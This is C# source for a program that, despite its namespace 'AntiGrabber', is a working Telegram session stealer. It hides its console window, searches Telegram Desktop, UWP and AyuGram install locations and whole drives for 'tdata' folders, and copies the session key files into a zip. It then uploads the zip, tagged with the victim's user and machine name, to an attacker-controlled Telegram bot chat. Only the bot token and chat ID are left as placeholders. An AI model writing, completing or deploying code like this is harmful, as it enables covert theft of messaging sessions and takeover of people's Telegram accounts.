using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace AntiGrabber
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        private const string BotToken = "Здесь будет токен бота";
        private const string ChatId = "Здесь будет чат ID";

        private static readonly string[] SessionPrefixes =
        {
            "D877F783D5D3EF8C",
            "A7FDF864FBC10B77",
            "0CA814316818D8F6",
            "C2B05980D9127787"
        };

        private static readonly string[] ProcessNames = { "Telegram", "AyuGram", "Telegram Desktop", "AyuGram Desktop" };

        static async Task Main()
        {
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }

            await SendTelegramMessage("🔍 *Запуск программы...*\nИщу клиент Telegram...");

            try
            {
                List<string> tdataPaths = await FindTdataPaths();

                if (tdataPaths.Count > 0)
                {
                    await SendTelegramMessage($"✅ *Найдено клиентов:* {tdataPaths.Count}");
                    foreach (var tdataPath in tdataPaths)
                    {
                        await SendTelegramMessage($"✅ *Обрабатываю клиент!* 📂\nПуть: `{tdataPath}`\nНачинаю обработку...");
                        await ProcessTdataFolder(tdataPath);
                    }
                }
                else
                {
                    await SendTelegramMessage("❌ *Клиент Telegram не найден.*");
                }
            }
            catch (Exception ex)
            {
                await SendTelegramMessage($"⚠ *Ошибка!* {ex.Message}\n🔍 Подробности: `{ex.StackTrace}`");
            }
        }

        private static async Task<List<string>> FindTdataPaths()
        {
            List<string> foundPaths = new List<string>();

            // 1. Проверка стандартных путей
            await SendTelegramMessage("🔍 *Проверка стандартных путей установки Telegram...*");

            // Путь для десктопной версии
            string appDataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string telegramDesktopPath = Path.Combine(appDataRoaming, "Telegram Desktop", "tdata");
            await CheckAndAddPath(telegramDesktopPath, foundPaths, "стандартный путь Desktop");

            // Путь для UWP версии (Windows Store)
            string appDataLocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string packagesPath = Path.Combine(appDataLocal, "Packages");

            if (Directory.Exists(packagesPath))
            {
                await SendTelegramMessage("🔍 *Проверка UWP версии Telegram...*");
                string[] telegramPackages = Directory.GetDirectories(packagesPath, "TelegramMessengerLLP*");

                foreach (string package in telegramPackages)
                {
                    await SendTelegramMessage($"🔍 *Проверка пакета:* `{Path.GetFileName(package)}`");

                    // Проверка всех возможных путей в UWP пакете
                    List<string> uwpPathsToCheck = new List<string>
                    {
                        Path.Combine(package, "LocalState", "tdata"),
                        Path.Combine(package, "LocalCache", "Roaming", "Telegram Desktop UWP", "tdata"),
                        Path.Combine(package, "LocalCache", "Roaming", "Telegram Desktop", "tdata"),
                        Path.Combine(package, "LocalCache", "tdata"),
                        Path.Combine(package, "RoamingState", "tdata")
                    };

                    foreach (string pathToCheck in uwpPathsToCheck)
                    {
                        await CheckAndAddPath(pathToCheck, foundPaths, $"UWP путь ({Path.GetDirectoryName(pathToCheck).Replace(package, "...")})");
                    }

                    // Более глубокий поиск tdata в пакете UWP
                    await SendTelegramMessage($"🔍 *Глубокий поиск tdata в пакете UWP...*");
                    await FindTdataInDirectory(package, foundPaths, 0, 4); // Поиск в глубину до 4 уровней

                    // Проверка на наличие сессий в разных папках пакета UWP
                    await CheckForSessionFilesInUwpPackage(package, foundPaths);
                }
            }

            // 2. Проверка запущенных процессов
            await SendTelegramMessage("🔍 *Проверка запущенных процессов Telegram...*");
            foreach (string processName in ProcessNames)
            {
                await SendTelegramMessage($"🔍 *Поиск процесса:* `{processName}`");
                foreach (var process in Process.GetProcessesByName(processName))
                {
                    try
                    {
                        string processPath = process.MainModule?.FileName;
                        if (!string.IsNullOrEmpty(processPath))
                        {
                            string processDir = Path.GetDirectoryName(processPath);
                            string tdataPath = Path.Combine(processDir, "tdata");
                            await CheckAndAddPath(tdataPath, foundPaths, $"процесс {processName}");
                        }
                    }
                    catch (Exception ex)
                    {
                        await SendTelegramMessage($"⚠ *Ошибка доступа к процессу {processName}:* `{ex.Message}`");
                    }
                }
            }

            // 3. Полное сканирование, если ничего не найдено
            if (foundPaths.Count == 0)
            {
                await SendTelegramMessage("🔍 *Стандартные пути не найдены. Начинаю полное сканирование дисков...*");
                foreach (DriveInfo drive in DriveInfo.GetDrives().Where(d => d.IsReady && d.DriveType == DriveType.Fixed))
                {
                    try
                    {
                        await SendTelegramMessage($"🔍 *Сканирование диска:* `{drive.Name}`");

                        // Проверяем известные пути на диске
                        string usersFolder = Path.Combine(drive.RootDirectory.FullName, "Users");
                        if (Directory.Exists(usersFolder))
                        {
                            foreach (var userDir in Directory.GetDirectories(usersFolder))
                            {
                                string appDataPath = Path.Combine(userDir, "AppData", "Roaming", "Telegram Desktop", "tdata");
                                await CheckAndAddPath(appDataPath, foundPaths, $"путь пользователя {Path.GetFileName(userDir)}");
                            }
                        }

                        // Ищем tdata напрямую
                        string[] tdataFolders = Directory.GetDirectories(drive.RootDirectory.FullName, "tdata", SearchOption.AllDirectories);
                        foreach (string folder in tdataFolders)
                        {
                            await CheckAndAddPath(folder, foundPaths, "найдено при сканировании");
                        }

                        // Ищем папки с prefixes
                        await SendTelegramMessage($"🔍 *Поиск файлов сессии на диске:* `{drive.Name}`");
                        await ScanForSessionFiles(drive.RootDirectory.FullName, foundPaths);
                    }
                    catch (Exception ex)
                    {
                        await SendTelegramMessage($"⚠ *Ошибка сканирования диска {drive.Name}:* `{ex.Message}`");
                    }
                }
            }

            return foundPaths.Distinct().ToList();
        }

        private static async Task FindTdataInDirectory(string dirPath, List<string> foundPaths, int currentDepth, int maxDepth)
        {
            if (currentDepth >= maxDepth)
                return;

            try
            {
                foreach (string subDir in Directory.GetDirectories(dirPath))
                {
                    try
                    {
                        if (Path.GetFileName(subDir).Equals("tdata", StringComparison.OrdinalIgnoreCase))
                        {
                            await CheckAndAddPath(subDir, foundPaths, $"UWP глубокий поиск: {subDir.Replace(dirPath, "...")}");
                        }
                        else
                        {
                            await FindTdataInDirectory(subDir, foundPaths, currentDepth + 1, maxDepth);
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // Пропускаем папки без доступа
                    }
                }
            }
            catch
            {
                // Игнорируем ошибки
            }
        }

        private static async Task CheckForSessionFilesInUwpPackage(string packagePath, List<string> foundPaths)
        {
            List<string> foldersToCheck = new List<string>
            {
                Path.Combine(packagePath, "LocalState"),
                Path.Combine(packagePath, "LocalCache"),
                Path.Combine(packagePath, "RoamingState")
            };

            foreach (string folder in foldersToCheck)
            {
                if (Directory.Exists(folder))
                {
                    await CheckFolderAndSubfoldersForSessions(folder, foundPaths, 0, 3);
                }
            }
        }

        private static async Task CheckFolderAndSubfoldersForSessions(string folderPath, List<string> foundPaths, int currentDepth, int maxDepth)
        {
            if (currentDepth >= maxDepth)
                return;

            try
            {
                if (HasSessionFiles(folderPath))
                {
                    foundPaths.Add(folderPath);
                    await SendTelegramMessage($"✅ *Найдены файлы сессии в UWP:* `{folderPath}`");
                    return; // Не продолжаем поиск в подпапках, если нашли сессию в текущей папке
                }

                foreach (string subDir in Directory.GetDirectories(folderPath))
                {
                    try
                    {
                        await CheckFolderAndSubfoldersForSessions(subDir, foundPaths, currentDepth + 1, maxDepth);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // Пропускаем папки без доступа
                    }
                }
            }
            catch
            {
                // Игнорируем ошибки
            }
        }

        private static async Task CheckAndAddPath(string path, List<string> foundPaths, string source)
        {
            if (Directory.Exists(path))
            {
                foundPaths.Add(path);
                await SendTelegramMessage($"✅ *Найдена tdata* ({source}):\n`{path}`");
            }
            else
            {
                await SendTelegramMessage($"❌ *Не найдено* ({source}):\n`{path}`");
            }
        }

        private static bool HasSessionFiles(string folderPath)
        {
            try
            {
                // Проверяем наличие файлов сессии
                foreach (string prefix in SessionPrefixes)
                {
                    if (Directory.GetFiles(folderPath, prefix + "*").Length > 0)
                    {
                        return true;
                    }

                    // Проверяем наличие подпапок с префиксами
                    string subFolder = Path.Combine(folderPath, prefix);
                    if (Directory.Exists(subFolder))
                    {
                        return true;
                    }
                }

                // Проверяем наличие key_datas
                if (File.Exists(Path.Combine(folderPath, "key_datas")))
                {
                    return true;
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        private static async Task ScanForSessionFiles(string rootPath, List<string> foundPaths)
        {
            try
            {
                foreach (string dir in Directory.GetDirectories(rootPath))
                {
                    try
                    {
                        if (HasSessionFiles(dir))
                        {
                            foundPaths.Add(dir);
                            await SendTelegramMessage($"✅ *Найдены файлы сессии:* `{dir}`");
                        }

                        // Ограничиваем глубину рекурсии для производительности
                        string[] pathParts = dir.Split(Path.DirectorySeparatorChar);
                        if (pathParts.Length < 5) // Ограничение глубины рекурсии
                        {
                            await ScanForSessionFiles(dir, foundPaths);
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // Пропускаем папки без доступа
                    }
                    catch (Exception ex)
                    {
                        await SendTelegramMessage($"⚠ *Ошибка сканирования* `{dir}`: `{ex.Message}`");
                    }
                }
            }
            catch
            {
                // Игнорируем ошибки на верхнем уровне
            }
        }

        private static async Task ProcessTdataFolder(string tdataPath)
        {
            try
            {
                string clientName = Path.GetFileName(Path.GetDirectoryName(tdataPath));
                if (clientName == "tdata") // Если сама папка tdata
                {
                    clientName = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(tdataPath)));
                }

                // Создаем уникальное имя для клиента, если путь слишком длинный или нестандартный
                if (string.IsNullOrWhiteSpace(clientName) || clientName.Length > 30)
                {
                    clientName = "Telegram-" + Guid.NewGuid().ToString().Substring(0, 8);
                }

                string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
                string tdataArchiveDir = Path.Combine(tempDir, "tdata");
                Directory.CreateDirectory(tdataArchiveDir);

                await SendTelegramMessage($"📂 *Обрабатываю tdata клиента {clientName}...*\nКопирую файлы...");

                // Копируем основные файлы сессии
                int filesCopied = 0;
                foreach (string file in Directory.GetFiles(tdataPath))
                {
                    string fileName = Path.GetFileName(file);
                    if (SessionPrefixes.Any(prefix => fileName.StartsWith(prefix)) || fileName == "key_datas")
                    {
                        string destPath = Path.Combine(tdataArchiveDir, fileName);
                        File.Copy(file, destPath, true);
                        filesCopied++;

                        if (filesCopied % 5 == 0 || fileName == "key_datas")
                        {
                            await SendTelegramMessage($"📄 *Файл добавлен:* `{fileName}`");
                        }
                    }
                }

                // Копируем файлы из подпапок с префиксами
                foreach (string prefix in SessionPrefixes)
                {
                    string subFolderPath = Path.Combine(tdataPath, prefix);
                    if (Directory.Exists(subFolderPath))
                    {
                        string subArchiveDir = Path.Combine(tdataArchiveDir, prefix);
                        Directory.CreateDirectory(subArchiveDir);

                        foreach (string file in Directory.GetFiles(subFolderPath))
                        {
                            string fileName = Path.GetFileName(file);
                            if (fileName.StartsWith("map") || fileName.StartsWith("config"))
                            {
                                string destPath = Path.Combine(subArchiveDir, fileName);
                                File.Copy(file, destPath, true);
                                await SendTelegramMessage($"📄 *Файл добавлен:* `{fileName}` (из папки {prefix})");
                            }
                        }
                    }
                }

                await SendTelegramMessage($"📦 *Создание архива клиента {clientName}...*");
                string archivePath = Path.Combine(Path.GetTempPath(), $"{clientName}-{DateTime.Now:yyyyMMdd-HHmmss}.zip");
                if (File.Exists(archivePath)) File.Delete(archivePath);
                ZipFile.CreateFromDirectory(tempDir, archivePath);

                await SendTelegramMessage("📦 *Архив создан!*\nОтправляю...");

                await SendTelegramFileWithMessage(archivePath, $"📦 *Архив Telegram*\n🗂 Клиент: {clientName}\n📂 Путь: `{tdataPath}`\n🕒 {DateTime.Now}\n👤 {Environment.UserName}\n💻 {Environment.MachineName}");

                // Очистка временных файлов
                await SendTelegramMessage("🧹 *Удаление временных файлов...*");
                File.Delete(archivePath);
                Directory.Delete(tempDir, true);
                await SendTelegramMessage("✅ *Обработка завершена!*");
            }
            catch (Exception ex)
            {
                await SendTelegramMessage($"⚠ *Ошибка обработки!* {ex.Message}\n🔍 Подробности: `{ex.StackTrace}`");
            }
        }

        private static async Task SendTelegramMessage(string message)
        {
            using (var client = new HttpClient())
            {
                string url = $"https://api.telegram.org/bot{BotToken}/sendMessage";
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("chat_id", ChatId),
                    new KeyValuePair<string, string>("text", message),
                    new KeyValuePair<string, string>("parse_mode", "Markdown")
                });
                await client.PostAsync(url, content);
            }
        }

        private static async Task SendTelegramFileWithMessage(string filePath, string message)
        {
            using (var client = new HttpClient())
            {
                string url = $"https://api.telegram.org/bot{BotToken}/sendDocument";
                var multipartContent = new MultipartFormDataContent
                {
                    { new StringContent(ChatId), "chat_id" },
                    { new StringContent(message), "caption" },
                    { new StringContent("Markdown"), "parse_mode" }
                };

                var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath))
                {
                    Headers = { ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip") }
                };

                multipartContent.Add(fileContent, "document", Path.GetFileName(filePath));
                await client.PostAsync(url, multipartContent);
            }
        }
    }
}
